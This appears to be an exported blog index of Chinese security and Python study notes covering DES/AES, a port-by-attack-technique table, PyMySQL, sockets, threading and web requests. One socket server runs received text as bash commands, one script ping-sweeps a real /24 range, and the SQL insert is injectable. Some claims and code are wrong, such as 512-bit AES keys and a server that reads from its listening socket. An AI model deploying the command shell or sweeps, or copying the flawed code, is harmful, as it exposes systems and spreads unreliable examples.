注：virsh和virt-manager工具在后面会学习。","categories":[{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"}],"tags":[]},{"title":"【密码学】对称密码体制","slug":"【密码学】对称密码体制","date":"2020-04-25T07:08:35.000Z","updated":"2020-04-26T05:52:50.000Z","comments":true,"path":"2020/04/25/【密码学】对称密码体制/","link":"","permalink":"http://example.com/2020/04/25/%E3%80%90%E5%AF%86%E7%A0%81%E5%AD%A6%E3%80%91%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","excerpt":"本文学习对称密码学的基础概念，分组密码的四种工作方式，以及详细介绍DES、AES的加密算法过程与Python实现。","text":"本文学习对称密码学的基础概念，分组密码的四种工作方式，以及详细介绍DES、AES的加密算法过程与Python实现。 概述：对称密码 要求加密与解密使用同一个共享密钥，因此要求通信双方必须在通信前商定密钥并妥善保存。 对称密码体制从工作方式上可以分为分组加密和序列密码两大类。 优点：算法公开、计算量小、加密速度快、加密效率高 缺点：交易双方都使用同样钥匙，安全性得不到保证 序列密码（流加密）：对明文的单字节进行运算，明文加密后密码保持和明文同样长度，解密是指用同样的密钥和密码算法及与加密相同的伪随机位流，用以还原明文位流。常见流密码算法有RC4、SEAL等。 分组密码（块加密）：将明文信息划分成不同的块，分别对每个块进行运算。多用于网络加密。分块长度越长，密码分析越困难，越不利于操作和运算，分块长度应该权衡安全性与实用性。常见分组密码算法有DES、AES等。 DES、3DES、AES常见对称加密算法包括DES、3DES、AES。 DES(Data Encryption Standard) 数据加密标准，速度较快，适用于加密大量数据的场合。 3DES(Triple DES) 基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高、 AES(Advanced Encryption Standard) 高级加密标准，下一代的加密算法，速度、安全级别更高，支持128，192，256，512位密钥的加密。 算法特征： 加密方与解密方使用同一个密钥。 加密解密的速度比较快，适合数据比较大时的使用。 密钥传输的过程不安全，且容易被破解，密钥管理比较麻烦。 分组加密的四种工作方式 ECB(Electronic Code Book) 电子编码本 CBC(Cipher Block Chaining) 密码分组链接 CFB(Cipher Feedback) 密码反馈 OFB(Output Feedback) 输出反馈 ECBECB模式是最简单的加密算法，明文消息被分成固定大小的块，并且每个块被单独加密。每个块的加密与解密都是独立的，且使用相同的方式进行加密，所以可以进行并行计算。但是这种方法存在缺点，一旦有一个块被破解，使用相同的方式可以解密其他块，导致可以解密出所有明文数据，安全性比较差。 适用场景：数据较少，加密前需要把明文数据填充到块大小的整数倍。 优点：简单、孤立，每个块单独运算。适合并行运算，传输错误一般只影响当前块。 缺点：同明文输出同密码，可能导致明文攻击。 ECB Encryption示意图 ECB Decryption示意图 CBCCBC模式中每一个分组要先和前一个分组加密后的数据进行XOR异或操作，然后再进行加密。因此每个密文块依赖该块之前的所有明文块，为了保持每条消息都具有唯一性，第一个数据块进行加密之前需要用初始化向量IV进行异或操作。 适用场景：最常见的加密方式，并且与ECB一样消息块必须填充到块大小的整倍数。 优点：串行化运算，相同明文不同密文。 缺点：需要初始向量。加密是连续的，不能并行处理。 CBC Encryption示意图 CBC Decryption示意图 CFBCFB模式与CBC模式比较相似，前一个分组的密文加密后和当前分组的明文XOR异或操作生成当前分组的密文。(与CBC模式仅在异或的顺序上不同) 优点：同明文不同密文，分组密钥转换为流密码 缺点：串行运算不利并行，传输错误可能导致后续传输块的错误 CFB Encryption示意图 CFB Decryption示意图 OFBOFB模式将分组密码转换为同步流密码（根据明文长度先独立生成相应长度的流密码），与CFB模式非常相似，CFB是前一个分组的密文加密后XOR当前分组明文。OFB是初始化向量IV不断加密后XOR前一组的明文。由于异或操作的对称性，OFB模式的解密与加密的流程一样。 优点：同明文不同密文，分组密钥转换为流密码 缺点：串行运算不利并行，传输错误可能导致后续传输块的错误。 OFB Encryption示意图 OFB Decryption示意图 DES加密过程概述采用56位密钥加密64位的明文数据 当n个64位明文数据块都经过DES加密处理（这里采用上述四种工作方式中的ECB模式）后，所得到的n个64位密文数据块串在一起就是密文输出。 加密流程图 Round：每一轮都进行一次扩展置换、S盒压缩和P盒置换。 三个知识难点 初始（终止）置换 扩展置换 S盒压缩 初始（终止）置换初始和终止置换都是按照一定的规则，将原来的64位二进制重新排序。 初始置换与终止置换表 从初始置换表中可以看出，将输入的58位换到第1位，第50位换到第2位，以此类推 从终止置换表中可以看出，将输入的40位换到第1位，第08位换到第2位，以此类推 举例例子来说明根据上述初始置换与终止置换表，给定原始数据（一般是16位十六进制数，下图已将其转化为64位二进制数） 计算置换后的数据 终止置换的原理和初始置换是一样的，他们的排列是互逆的，即经过一次初始置换和终止置换，64位二进制数就还原了。 扩展置换经过初始置换的64位数据被分成左右32位数据，其中一边的32位进行扩展置换得到48位的数据。 具体的扩展过程就是在某些位置进行添位操作。 我们仍可以参照初始数据置换表类似的扩展置换表。 扩展置换表 根据这32位二进制数据来展示扩展置换的过程. 将原始数据分成8组，接着将每个组从4位扩展成6位的组。 121101 0001 0011 01000010 0011 0011 1011 根据扩展字段表 第一组的头添位是原始数据的第32位1，第一组的尾添位是原始数据的第05位0 第二组的头添位是原始数据的第04位1，第一组的尾添位是原始数据的第09位0 …依次类推 这样就完成从32位扩展到48位的扩展置换过程。 12111010 100010 100110 101000000100 000110 100111 110111 S盒压缩处理经过扩展的48位明文和48位密钥进行异或运算后，再使用8个S盒压缩处理得到32位数据。 实际上就是将48位输入等分成8块，每块6位输入压缩为4位输出。与前面置换表类似的，具体处理时是分别采用8张4行16列的表来进行替换从而达到压缩的目的。 举例例子来说明输入原始数据，并将其分成8组，每组6位。 1234111111 100101110011 001100011001 010111111011 011000 第一组的压缩表 我们以第一组为例来演示S盒压缩处理 12345原始数据：111111头尾数据（第0位和最后一位）：11 -&gt; 3 行数中间四位：1111 -&gt; 15 列数根据行数和列数即可在压缩表中找到对应的压缩数13再转化成二进制1101。 在全部组完成S盒压缩，则是从48位转换到32为的S盒压缩处理过程。 P盒置换经过S盒压缩处理后，再经过P盒置换，就得到一轮运算中的最后输出了。 DES Python实现若需要在Python中使用des加密，可以直接使用pyDes库加密，该库提供了CBC和ECB两种加密方式。（注：安装pyDes库 pip install pyDes） pyDes.des(key, [mode], [IV], [pad], [padmode]) Key 输入密钥 mode ECB或者CBC IV 初始密钥8位（在使用CBC模式时） pad/padmode 默认None/PAD_NORMAL 需要注意的是在说明文档里写着Python3使用字节而不是字符串。 以下为本人使用的例子，采用CBC加密方法。 12345678910111213import base64import pyDesDes_key = b&quot;ABCDEFGH&quot; # 密钥Des_IV = b&quot;\\x33\\x22\\x81\\x35\\x38\\xBC\\xE7\\x5A&quot; #自动IV向量def DesEncrypt(str): k = pyDes.des(Des_key, pyDes.CBC, Des_IV, pad=None, padmode=PAD_PKCS5) EncryptStr = k.encrypt(str) return base64.b64encode(EncryptStr)DesEncrypt(b&quot;let do it&quot;) 1Output: b&#39;Ub48xNwxZ&#x2F;B8ZpEvpO+Mwg&#x3D;&#x3D;&#39; AES加密过程 AES加密方式有五种：ECB, CBC, CTR, CFB, OFB 从安全性角度推荐CBC加密方法，本文介绍了CBC,ECB两种加密方法的python实现 python 在 Windows下使用AES时要安装的是pycryptodome 模块 pip install pycryptodome python 在 Linux下使用AES时要安装的是pycrypto模块 pip install pycrypto CBC加密需要一个十六位的key(密钥)和一个十六位iv(偏移量) ECB加密不需要iv AES-CBC Python实现1234567891011121314151617181920212223242526272829303132333435363738394041from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hex# 如果text不足16位的倍数就用空格补足为16位def add_to_16(text): if len(text.encode(&#x27;utf-8&#x27;)) % 16: add = 16 - (len(text.encode(&#x27;utf-8&#x27;)) % 16) else: add = 0 text = text + (&#x27;\\0&#x27; * add) return text.encode(&#x27;utf-8&#x27;)# 加密函数def encrypt(text): key = &#x27;9999999999999999&#x27;.encode(&#x27;utf-8&#x27;) mode = AES.MODE_CBC iv = b&#x27;qqqqqqqqqqqqqqqq&#x27; text = add_to_16(text) cryptos = AES.new(key, mode, iv) cipher_text = cryptos.encrypt(text) # 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里转为16进制字符串 return b2a_hex(cipher_text)# 解密后，去掉补足的空格用strip() 去掉def decrypt(text): key = &#x27;9999999999999999&#x27;.encode(&#x27;utf-8&#x27;) iv = b&#x27;qqqqqqqqqqqqqqqq&#x27; mode = AES.MODE_CBC cryptos = AES.new(key, mode, iv) plain_text = cryptos.decrypt(a2b_hex(text)) return bytes.decode(plain_text).rstrip(&#x27;\\0&#x27;)if __name__ == &#x27;__main__&#x27;: e = encrypt(&quot;hello world&quot;) # 加密 d = decrypt(e) # 解密 print(&quot;加密:&quot;, e) print(&quot;解密:&quot;, d) AES-ECB Python实现1234567891011121314151617181920212223242526272829303132333435363738394041&quot;&quot;&quot;ECB没有偏移量&quot;&quot;&quot;from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexdef add_to_16(text): if len(text.encode(&#x27;utf-8&#x27;)) % 16: add = 16 - (len(text.encode(&#x27;utf-8&#x27;)) % 16) else: add = 0 text = text + (&#x27;\\0&#x27; * add) return text.encode(&#x27;utf-8&#x27;)# 加密函数def encrypt(text): key = &#x27;9999999999999999&#x27;.encode(&#x27;utf-8&#x27;) mode = AES.MODE_ECB text = add_to_16(text) cryptos = AES.new(key, mode) cipher_text = cryptos.encrypt(text) return b2a_hex(cipher_text)# 解密后，去掉补足的空格用strip() 去掉def decrypt(text): key = &#x27;9999999999999999&#x27;.encode(&#x27;utf-8&#x27;) mode = AES.MODE_ECB cryptor = AES.new(key, mode) plain_text = cryptor.decrypt(a2b_hex(text)) return bytes.decode(plain_text).rstrip(&#x27;\\0&#x27;)if __name__ == &#x27;__main__&#x27;: e = encrypt(&quot;hello world&quot;) # 加密 d = decrypt(e) # 解密 print(&quot;加密:&quot;, e) print(&quot;解密:&quot;, d)","categories":[{"name":"密码学","slug":"密码学","permalink":"http://example.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[]},{"title":"常见端口及攻防手段","slug":"常见端口及攻防手段","date":"2020-04-22T06:31:17.000Z","updated":"2020-04-22T06:43:43.000Z","comments":true,"path":"2020/04/22/常见端口及攻防手段/","link":"","permalink":"http://example.com/2020/04/22/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%94%BB%E9%98%B2%E6%89%8B%E6%AE%B5/","excerpt":"本文学习常见端口以及对应的服务器的攻防手段。","text":"本文学习常见端口以及对应的服务器的攻防手段。 端口号 端口说明 攻击技巧 21/22/69 ftp/tftp文件传输协议 爆破\\嗅探\\溢出\\后门 22 ssh：远程连接 爆破OpenSSH；28个退格 23 telnet：远程连接 爆破\\嗅探 25 smtp：邮件服务 邮件伪造 53 DNS：域名系统 DNS区域传输\\DNS劫持\\DNS缓存投毒\\DNS欺骗\\利用DNS隧道技术刺透防火墙 67/68 dhcp 劫持\\欺骗 110 pop3 爆破 139 samba 爆破\\未授权访问\\远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击\\未授权访问 512/513/514 linux r 直接使用rlogin 873 rsync 未授权访问 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令\\信息泄漏：源代码 1433 mssql 爆破：使用系统用户登录\\注入攻击 1521 oracle 爆破：TNS\\注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破\\拒绝服务\\注入 3389 rdp 爆破\\Shift后门 4848 glassfish 爆破：控制台弱口令\\认证绕过 5000 sybase/DB2 爆破\\注入 5432 postgresql 缓冲区溢出\\注入攻击\\爆破：弱口令 5632 pcanywhere 拒绝服务\\代码执行 5900 vnc 爆破：弱口令\\认证绕过 6379 redis 未授权访问\\爆破：弱口令 7001 weblogic ava反序列化\\控制台弱口令\\控制台部署webshell 80/443/8080 web 常见web攻击\\控制台爆破\\对应服务器版本漏洞 8069 zabbix 远程命令执行 9090 websphere控制台 爆破：控制台弱口令\\Java反序列 9200/9300 elasticsearch 远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破\\未授权访问","categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"Python数据库编程","slug":"Python数据库编程","date":"2020-04-13T13:57:33.000Z","updated":"2020-04-19T03:19:28.000Z","comments":true,"path":"2020/04/13/Python数据库编程/","link":"","permalink":"http://example.com/2020/04/13/Python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/","excerpt":"本文讲解Python数据库编程。","text":"本文讲解Python数据库编程。 Python DB API在没有Python DB API之前 在有了Python DB API之后 Python DB API运行机制 Python DB API访问数据库流程 Python MySQL开发环境Python代码 + MySQL服务器 = MySQL for Python MySQL-python模块 Mac/Linux系统下无法安装可以查看这个教程 呃。。还是没有装上。MySQLdb不支持Python3，所以我们选择PyMySQL。（使用方法还是类似的） PyMySQLPyMySQL常用对象与方法数据库连接对象connection 连接对象：建立Python客户端与数据库的网络连接 创建方法：pymysql.connect(参数) pymysql.connect(参数) 参数名 类型 说明 host 字符串 MySQL服务器地址 port 数字 MySQL服务器端口号（可选，默认为3306） user 字符串 用户名 passwd 字符串 密码 db 字符串 数据库名（可选，默认访问可以连接的数据库） Charset 字符串 连接编码 connection对象支持的方法 方法名 说明 cursor() 使用该连接创建并返回游标 commit() 提交当前事物 rollback() 回滚当前事物 close() 关闭连接 cursor对象支持的方法 参数名 说明 execute(op[.args]) 执行一个数据库查询命令(select\\insert\\delete) fetchone() 取得结果集里的下一行 fetchmany(size) 获取结果集里的下几行 fetchall() 获取结果集里剩下的所有行 rowcount() 最近一次execute返回数据的行数或影响行数 close() 关闭 PyMySQL连接测试123456789101112131415161718192021import pymysql# 打开数据库连接 没有密码就不填写了passwd=&#x27;&#x27;db = pymysql.connect(host=&quot;localhost&quot;,port=3306, user=&quot;root&quot;) # 使用 cursor() 方法创建一个游标对象 cursorcursor = db.cursor() # 使用 execute() 方法执行 SQL 查询 sql=&quot;select schema_name from information_schema.schemata&quot;cursor.execute(sql) # 使用 fetchone() 方法获取单条数据.data = cursor.fetchone() print (&quot;Databases: %s &quot; % data) # 关闭数据库连接cursor.close()db.close() 1Databases : mysql Python数据库编程示例爬取数据123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsimport reimport jsonfrom requests.exceptions import RequestExceptionimport time headers = &#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#x27;&#125;def get_one_page(url): try: res = requests.get(url, headers=headers) if res.status_code == 200: return res.text return None except RequestException: return Nonedef urls(): return [&#x27;https://movie.douban.com/top250?start=&#123;&#125;&amp;filter=&#x27;.format(str(i)) for i in range(0,250,25)]key = []p1 = &#x27;&lt;span class=&quot;title&quot;&gt;(.*?)&lt;/span&gt;&#x27;p2 = &#x27;&#x27;&#x27;导[\\u4e00-\\u9fa5].*&#x27;&#x27;&#x27;def get_movie_name(p): key = [] for url in urls(): key += re.findall(p1, get_one_page(url)) for k in key: if &quot;&amp;&quot; in k: key.remove(k) return key def get_movie_info(p): key = [] info = [] for url in urls(): key += re.findall(p, get_one_page(url)) for i in key: info += str(i[:-7].replace(&quot;&amp;nbsp;&quot;,&quot; &quot;)) return infomovie_name = get_movie_name(p1)movie_info = get_movie_info(p2) 创建数据表 放入数据库12345678910111213141516171819202122import pymysql# 打开数据库连接db = pymysql.connect(host=&quot;localhost&quot;,port=3306, user=&quot;root&quot;, db=&#x27;test1&#x27;) # 使用 cursor() 方法创建一个游标对象 cursorcursor = db.cursor()for mn in movie_name: sql = &quot;insert into movie (name) VALUES (&#x27;%s&#x27;)&quot; % (mn) print(sql) # 使用 execute() 方法执行 SQL 查询 cursor.execute(sql)#使用 fetchone() 方法获取单条数据.data = cursor.fetchone() print (&quot;Databases : %s &quot; % data) # 关闭数据库连接db.commit()","categories":[{"name":"Python安全编程","slug":"Python安全编程","permalink":"http://example.com/categories/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"Python网络编程","slug":"Python网络编程","date":"2020-04-13T08:21:28.000Z","updated":"2020-06-18T15:05:55.000Z","comments":true,"path":"2020/04/13/Python网络编程/","link":"","permalink":"http://example.com/2020/04/13/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/","excerpt":"本文讲解Python网络编程。","text":"本文讲解Python网络编程。 C/S架构C/S（C:client，S:Server）客户机和服务器结构。Server目的就是等待Client的请求，Client连上Server发送必要的数据，然后等待Server端完成请求的反馈。 C/S网络编程 服务器端进行设置，首先创建一个通信端点，让服务器端能够监听请求，之后就进入等待和处理客户机请求的无限循环中。客户机编程相对服务器简单，只要创建一个通信端点，建立到服务器的连接，就可以提出请求了。 套接字一种具有之前所说的”通信端点“概念的计算机网络数据结构。网络化的应用程序在开始任何通讯之前都必须创建套接字。 Python支持的Socket：AF_UNIX\\AF_NETLINK\\AF_INET（基于网络的套接字） Socket模块socket模块的socket()函数用来创建套接字:socket(socket_family, socket_type, protocol=0) 创建TCP/IP套接字：tcpsock=socket(socket.AF_INET, socket.SOCK_STREAM) 服务器端套接字函数 函数 描述 s.bind() 绑定地址（主机，端口）到套接字 s.listen() 开始TCP监听 s.accept() 被动接受TCP客户端连接，等待连接的到来 客户端套接字 函数 描述 s.connect() 主动初始化TCP服务器连接 s.connect_ex() Connect函数的扩展版本，出错时返回错误代码，而不是抛出异常 公共用途套接字 函数 描述 s.recv() 接受TCP数据 s.send() 发送TCP数据 s.sendall() 完整发送TCP数据 s.recvfrom() 接受UDP数据 s.sendto() 发送UDP数据 s.getpeemame() 连接到当前套接字的远端地址 s.getsockname() 当前套接字的地址 s.getsockopt() 返回指定套接字的参数 s.setsockopt() 设置指定套接字的参数 s.close() 关闭套接字（创建使用后记得关闭） 网络编程示例创建一个TCP服务器的流程12345678ss = socket.socket() #创建服务器套接字ss.bind(host,port) # 把地址绑定到套接字上ss.listen() #设置监听连接inf_loop: # 服务器无线循环 cs = ss.accept() # 接收客户端连接common_loop: # 通信循环 cs.recv()/cs.send() # 对话（接收与发送）cs.close() # 关闭客户端套接字 创建一个TCP客户端的流程12345cs.socket() # 创建客户端套接字cs.connect() # 尝试连接套接字common_loop: # 通信循环 cs.recv()/cs.send() #对话（接收与发送）cs.close() # 关键客户端套接字 编写服务器端脚本1234567891011121314151617181920212223242526# server.pyfrom socket import *import timeHOST = &#x27;127.0.0.1&#x27;PORT = 23342BUFSIZE = 1024ADDR = (HOST,PORT)tcpServer = socket(AF_INET, SOCK_STREAM)tcpServer.bind(ADDR)tcpServer.listen(5)while True: print(&#x27;等待连接...&#x27;) tcpClient, addr = tcpServer.accept() print(&#x27;连接来自：&#x27;+ addr) while True: data = tcpServer.recv(BUFSIZE) if not data: break tcpClient.send(&#x27;[%s]%s&#x27; % (time.ctime(), data))tcpClient.close()tcpServer.close() 12等待连接...连接来自：(&#39;127.0.0.1&#39;, 54879) 编写客户端脚本123456789101112131415161718192021222324# client.pyfrom socket import *import timeHOST = &#x27;127.0.0.1&#x27;PORT = 23342BUFSIZE = 1024ADDR = (HOST,PORT)tcpClient = socket(AF_INET, SOCK_STREAM)tcpClient.connect(ADDR)while True: data = input(&#x27;~:&#x27;) if not data: break tcpClient.send(data) data = tcpClient.recv(BUFSIZE) if not data: break print(data)tcpClient.close() 1234~:test[Mon Apr 13 20:40:30 2020] test~:nihao[Mon Apr 13 20:40:40 2020] nihao 编写服务器端脚本（shell版本）1234567891011121314151617181920212223242526272829# server.pyfrom socket import *import timefrom subprocess import Popen, PIPEHOST = &#x27;127.0.0.1&#x27;PORT = 23342BUFSIZE = 1024ADDR = (HOST,PORT)tcpServer = socket(AF_INET, SOCK_STREAM)tcpServer.bind(ADDR)tcpServer.listen(5)while True: print(&#x27;等待连接...&#x27;) tcpClient, addr = tcpServer.accept() print(&#x27;连接来自：&#x27;+ addr) while True: data = tcpServer.recv(BUFSIZE) if not data: break cmd = Popen([&#x27;/bin/bash&#x27;, &#x27;-c&#x27;, data], stdin=PIPE, stdout=PIPE) data = cmd.stdout.read() tcpClient.send(&#x27;[%s]%s&#x27; % (time.ctime(), data))tcpClient.close()tcpServer.close() 12等待连接...连接来自：(&#39;127.0.0.1&#39;, 54891) 重新执行client.py（在server.py执行后） 123~:python3 --version[Mon Apr 13 21:52:41 2020]Python 3.8.1","categories":[{"name":"Python安全编程","slug":"Python安全编程","permalink":"http://example.com/categories/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"Python多线程编程","slug":"Python多线程编程","date":"2020-04-12T12:50:37.000Z","updated":"2020-04-13T08:05:09.000Z","comments":true,"path":"2020/04/12/Python多线程编程/","link":"","permalink":"http://example.com/2020/04/12/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/","excerpt":"本文讲解Python多线程编程。","text":"本文讲解Python多线程编程。 趣味小游戏点击进入爬虫闯关1 你需要在每一个页面获取数字，然后将其添加到URL后，依次循环，直到最终的成功页面。当然我们就利用爬虫来完成啦！ 12345678910111213141516import requestsimport reurl = &#x27;http://www.heibanke.com/lesson/crawler_ex00/&#x27;res = requests.get(url)print(res.status_code)#当HTTP状态码为200时，表示页面返回正常while res.status_code == 200: num = re.findall(r&#x27;\\d&#123;5&#125;&#x27;,res.text) #分析页面得知数字在正则匹配后的第二个，将其取出并置于网址后面 url = &#x27;http://www.heibanke.com/lesson/crawler_ex00/&#x27; + num[1] print(url) res = requests.get(url)print(url) 1234567891011http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;33818http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;30867http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;44513http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;53577http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;48950http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;69524http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;36499....（中间省略，太多了）http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;21070http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;14042http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;14042 线程和进程进程：进程是程序的一次执行。每一个进程都有自己的地址空间、内存、数据栈及其他记录其运行轨迹的辅助数据。 线程：所有的线程运行在同一个进程中，共享相同的运行环境。线程有开始顺序执行和结束三个部分。 什么？完全听不懂在说什么？看看下面的介绍吧！ 对于操作系统来说，一个任务就是一个进程（Process），比如打开一个浏览器就是启动一个浏览器进程，打开一个记事本就启动了一个记事本进程，打开两个记事本就启动了两个记事本进程，打开一个Word就启动了一个Word进程。 有些进程还不止同时干一件事，比如Word，它可以同时进行打字、拼写检查、打印等事情。在一个进程内部，要同时干多件事，就需要同时运行多个“子任务”，我们把进程内的这些“子任务”称为线程（Thread）。 由于每个进程至少要干一件事，所以，一个进程至少有一个线程。当然，像Word这种复杂的进程可以有多个线程，多个线程可以同时执行，多线程的执行方式和多进程是一样的，也是由操作系统在多个线程之间快速切换，让每个线程都短暂地交替运行，看起来就像同时执行一样。当然，真正地同时执行多线程需要多核CPU才可能实现。 thread模块start_new_thread(function, args kwargs=None) 产生一个新的线程，在新的线程中用指定的参数和可选的kwargs来调用这个函数。 注意：使用该方式时，一定要家time.sleep()，否则每个线程将可能不执行。 方法缺点：在遇到较复杂的问题时，线程数不易控制。 注意：python3中，由于thread有两个很致命的问题，所以python3更推荐用threading代替thread，所以，thread被改名为_thread。 123456789101112import _threadimport timedef fun1(): print(&#x27;hello world! %s\\n&#x27; % time.ctime()) def main(): _thread.start_new_thread(fun1, ()) _thread.start_new_thread(fun1, ()) time.sleep(2) main() 小脚本–对C段所用信息进行检测 检测是否ping的通的返回内容 1234567891011import _threadimport timefrom subprocess import Popen,PIPEdef ping_check(): check = Popen([&#x27;/bin/bash&#x27;, &#x27;-c&#x27;, &#x27;ping -c 2 &#x27;+&#x27;127.0.0.1&#x27;],stdin=PIPE,stdout=PIPE) data = check.stdout.read() if &#x27;ttl&#x27; in str(data): print(&#x27;UP&#x27;)ping_check() 123456789101112131415# ping 成功返回内容b&#39;PING 127.0.0.1 (127.0.0.1): 56 data bytes64 bytes from 127.0.0.1: icmp_seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.043 ms64 bytes from 127.0.0.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.098 ms--- 127.0.0.1 ping statistics ---2 packets transmitted, 2 packets received, 0.0% packet lossround-trip min&#x2F;avg&#x2F;max&#x2F;stddev &#x3D; 0.043&#x2F;0.071&#x2F;0.098&#x2F;0.028 ms# ping 失败返回内容b&#39;PING 127.1.0.1 (127.1.0.1): 56 data bytesRequest timeout for icmp_seq 0--- 127.1.0.1 ping statistics ---2 packets transmitted, 0 packets received, 100.0% packet loss\\n&#39; 对C段所有信息检测 1234567891011121314151617import _threadimport timefrom subprocess import Popen,PIPEdef ping_check(ip): check = Popen([&#x27;/bin/bash&#x27;, &#x27;-c&#x27;, &#x27;ping -c 2 &#x27;+ip],stdin=PIPE,stdout=PIPE) data = check.stdout.read() if &#x27;ttl&#x27; in str(data): print(ip)def main(): for i in range(1,255): ip = &#x27;185.199.108.&#x27;+str(i) _thread.start_new_thread(ping_check, (ip,)) time.sleep(0.1)main() 1234185.199.108.1185.199.108.2185.199.108.3... threading模块threading模块基本构造123456789101112131415161718192021222324252627import threadingimport time# 定义函数def fun1(name): print(name + time.ctime(),end=&#x27;\\n&#x27;) def main(): # 设置线程集合 threads = [] keys = [&#x27;张三 &#x27;, &#x27;李四 &#x27;, &#x27;王五 &#x27;] threads_count = len(keys) # 设置线程内容某个函数 for i in range(threads_count): t = threading.Thread(target=fun1, args=(keys[i],)) threads.append(t) #设置线程开始 for i in range(threads_count): threads[i].start() #设置线程结束 for i in range(threads_count): threads[i].join() main() 张三 Mon Apr 13 15:41:37 2020 李四 Mon Apr 13 15:41:37 2020 王五 Mon Apr 13 15:41:37 2020 Queue模块12345678import queueq = queue.Queue()for i in range(10): q.put(i)q.empty(), q.qsize() (False, 10) 取出Queue队列的元素 12while q.empty() == False: print(q.get(), end=&#x27; &#x27;) 0 1 2 3 4 5 6 7 8 9 Queue + Threading 解决C段信息探测1234567891011121314151617181920212223242526272829303132333435363738394041import threadingimport queuefrom subprocess import Popen,PIPEclass fun1(threading.Thread): def __init__(self, queue): threading.Thread.__init__(self) self._queue = queue def run(self): while not self._queue.empty(): ip = self._queue.get() ping_check(ip) def ping_check(self, ip): check = Popen([&#x27;/bin/bash&#x27;, &#x27;-c&#x27;, &#x27;ping -c 2 &#x27;+ip],stdin=PIPE,stdout=PIPE) data = check.stdout.read() if &#x27;ttl&#x27; in str(data): print(ip) def main(): threads = [] threads_count = 200 q = queue.Queue() for i in range(1,255): q.put(&#x27;185.199.108.&#x27;+str(i)) for i in range(threads_count): threads.append(fun1(q)) for i in threads: i.start() for i in threads: i.join() main() 123456789185.199.108.127185.199.108.37185.199.108.31185.199.108.33185.199.108.32185.199.108.30185.199.108.12185.199.108.36........","categories":[{"name":"Python安全编程","slug":"Python安全编程","permalink":"http://example.com/categories/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"Python Web编程","slug":"Python Web编程","date":"2020-04-12T04:27:42.000Z","updated":"2020-04-12T12:42:21.000Z","comments":true,"path":"2020/04/12/Python Web编程/","link":"","permalink":"http://example.com/2020/04/12/Python%20Web%E7%BC%96%E7%A8%8B/","excerpt":"本文学习Python Web编程以及利用爬虫技术爬取豆瓣电影TOP250的电影名。","text":"本文学习Python Web编程以及利用爬虫技术爬取豆瓣电影TOP250的电影名。 必备模块介绍urllib urllib提供了一系列用于操作URL的功能 urllib.request.urlopen(url,data,timeout) 发起请求获取响应页面 1234import urllib.requesturl = &quot;http://www.baidu.com&quot;r = urllib.request.urlopen(url)print(r.read()) urllib.request.urlretrieve(url,filepath+filename) 发起请求下载文件 12url = &#x27;http://www.baidu.com/img/bd_logo1.png&#x27;urllib.request.urlretrieve(url,filename=&#x27;./bd.png&#x27;) Requests 安装 12pip install requestsimport requests 发送网络请求123456requests.get()requests.post(url)requests.put(url)requests.delete(url)requests.head(url)requests.options(url) 为URL传递参数1234payload = &#123;&#x27;key1&#x27;:&#x27;value1&#x27;,&#x27;key2&#x27;:&#x27;value2&#x27;&#125;r = requests.get(&quot;http://httpbin.org/get&quot;, params=payload)print(r.url)#http://httpbin.org/get?key2=value2&amp;key1=value1 响应内容123r = requests.get(&quot;http://nizeyu.xyz&quot;)print(r.text)print(r.encoding) 二进制响应内容12r = requests.get(&quot;http://nizeyu.xyz&quot;)print(r.content) 定制请求头（headers中可以加入cookies，在一些爬虫场景需要登录的情况下可以使用）12header = &#123;&#x27;conten-type&#x27;:&#x27;application/json&#x27;&#125;r = requests.get(&quot;http://nizeyu.xyz&quot;, header=headers) 复杂的POST请求12payload = &#123;&#x27;key1&#x27;:&#x27;value1&#x27;,&#x27;key2&#x27;:&#x27;value2&#x27;&#125;r = requests.post(&quot;http://httpbin.org/post&quot;, data=payload) 响应状态码（适用于目录扫描场景）12r = requests.get(url)print(r.status_code) 响应头12r = requests.get(url)print(r.headers) 